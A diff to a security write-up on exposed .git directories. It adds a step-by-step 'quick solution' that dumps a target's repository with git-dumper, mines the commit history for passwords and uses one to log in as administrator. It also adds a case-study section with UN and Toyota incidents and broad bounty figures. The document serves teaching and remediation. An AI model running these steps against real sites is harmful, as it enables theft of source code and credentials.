@@ -1,5 +1,22 @@
 # Information Disclosure: Exposed Version Control (.git) in Production
 
+> [!TIP]
+> ### ⚡ Quick Solution (Direct Execution)
+> 1. Verify Git folder exposure: browse to `https://target-website.com/.git/HEAD`.
+> 2. Dump the entire Git repository to your local machine:
+>    ```bash
+>    pip install git-dumper
+>    git-dumper https://target-website.com/.git/ ./leaked-repo
+>    ```
+> 3. Search the commit history for previously committed credentials:
+>    ```bash
+>    cd ./leaked-repo && git log -p
+>    # or filter by keywords: git log -S "password" -p
+>    ```
+> 4. Use the extracted password to authenticate as `administrator`.
+
+---
+
 The `.git` folder is a hidden directory initialized by Git to track repository commits, history, user metadata, branches, and object hashes.
 
 If the `.git` directory is inadvertently deployed or left accessible via HTTP (`https://target-website.com/.git/`), attackers can **download the entire source code repository and historical commits**.
@@ -121,6 +138,14 @@ Exposed `.git` directories are consistently rated **High** to **Critical** in bu
 3. **Zero-Day Discovery:** Enables attackers to search offline for backend vulnerabilities.
 
 ---
+
+## 🌍 Real-World Case Study & Security Incidents
+
+### United Nations (UN) & Toyota Exposed `.git` Directory Incidents
+Exposed source control repositories represent a goldmine for attackers seeking complete architectural blueprints:
+* **United Nations Leak (2021):** Security researchers identified an exposed `/.git` directory on a United Nations infrastructure subdomain. Using automated dumping utilities like `git-dumper`, researchers reconstructed the entire source tree and analyzed historical commits using `git log -p`. They discovered database credentials and private API tokens that developers had committed and later attempted to remove in subsequent commits.
+* **Toyota Supply Chain Breach:** A similar exposure affected a prominent Toyota parts supplier, where an unprotected `.git` folder remained publicly accessible for years, exposing internal supply chain application code and infrastructure access keys.
+* **Severity & Impact:** Public `.git` exposures are categorized as **CRITICAL / HIGH Severity**, commanding bounties between **$10,000 and $20,000 USD** because they grant attackers full source code visibility and embedded credentials.
 
 ## 4. Prevention & Remediation (Best Practices)
 
